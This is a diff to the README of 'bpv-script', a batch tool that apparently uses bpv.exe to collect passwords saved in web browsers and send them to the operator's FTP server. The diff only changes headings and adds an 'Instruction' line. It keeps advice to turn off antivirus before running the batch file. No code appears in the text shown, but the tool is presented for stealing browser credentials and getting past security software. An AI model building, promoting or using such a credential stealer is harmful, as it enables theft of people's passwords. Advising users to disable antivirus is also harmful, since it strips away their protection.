@@ -1,6 +1,8 @@
-# bpv-script
+## bpv-script
 
-simple script using bpv.exe to send founded on your web-browsers passwords to your ftp server.
+# simple script using bpv.exe to send founded on your web-browsers passwords to your ftp server.
+
+Instruction : 
 
 Note1: Remember that opening ANY batch file might alert your antivirus, in which case the batch file will be deleted. 
 If you don't want that to happen, make sure the antivirus is turned off before opening any batch file.
